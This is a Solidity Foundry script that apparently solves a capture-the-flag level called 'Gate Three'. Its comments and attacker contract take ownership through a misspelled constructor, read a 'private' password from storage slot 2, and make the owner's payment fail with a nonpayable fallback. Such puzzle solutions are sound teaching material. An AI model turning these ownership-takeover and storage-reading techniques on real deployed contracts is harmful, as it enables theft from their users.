// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

/**
 * * Passing through gate 1:
 * - You got to be Owner, Just call the construct0r() metho (they mispelled constructor())
 * - create a contract and call the construct0r() through it, and contract has to be the msg.sender & owner And player has to be the tx.origin to pass thorugh the gateOne()
 *
 * * Passing through gate 2:
 * - allowEntrance has to be true which is false by default
 * - pass through it by reading the slot#2 of the Trick Contract
 *
 * * Passing through gate 3:
 * - gate should have more than 0.001 ether and `payable(owner).send(0.001) == false`
 * - send them some ETH and dont add receive function in the contract but add fallback function which should be nonpayable
 */

interface IGateThree {
    function construct0r() external;

    function trick() external view returns (address);

    function createTrick() external;

    function enter() external;

    function getAllowance(uint256) external;

    function allowEntrance() external view returns (bool);

    function entrant() external view returns (address);
}

contract GateThreeAttacker is Script, HelperConfigLib {
    function run(address _victimAddress) external {
        vm.startBroadcast(ATTACKER_KEY);
        GateBreaker gateBreaker = new GateBreaker{value: 0.0015 ether}(
            _victimAddress,
            ATTACKER_ADDRESS
        );

        gateBreaker.enterGatesPrep1();

        bytes32 secretPassword = vm.load(
            gateBreaker.getTrickAddr(),
            bytes32(uint256(2))
        );

        gateBreaker.enterGates(uint256(secretPassword));
        vm.stopBroadcast();
    }
}

contract GateBreaker {
    IGateThree gateThree;
    address trickAddr;
    address player;

    constructor(address _gateThreeAddress, address _playerAddr) payable {
        gateThree = IGateThree(_gateThreeAddress);
        player = _playerAddr;
    }

    function _callConstruct0r() internal {
        gateThree.construct0r();
    }

    function _initTrick() internal {
        trickAddr = gateThree.trick();
        if (trickAddr == address(0)) {
            gateThree.createTrick();
            trickAddr = gateThree.trick();
            require(trickAddr != address(0), "Trick Creation failed");
        }
    }

    function enterGatesPrep1() external {
        _callConstruct0r();
        _initTrick();
    }

    function enterGates(uint256 _secretPassword) external {
        gateThree.getAllowance(_secretPassword);
        require(gateThree.allowEntrance(), "Allowance is still false");

        if (payable(address(gateThree)).balance <= 0.001 ether) {
            bool paymentSuccess = payable(address(gateThree)).send(
                0.0015 ether
            );
            require(paymentSuccess == true, "Payment to gate has failed");
        }

        gateThree.enter();

        require(gateThree.entrant() == player, "Failed, Gate is not broken");
    }

    function getTrickAddr() external view returns (address) {
        return trickAddr;
    }

    fallback() external {}
}
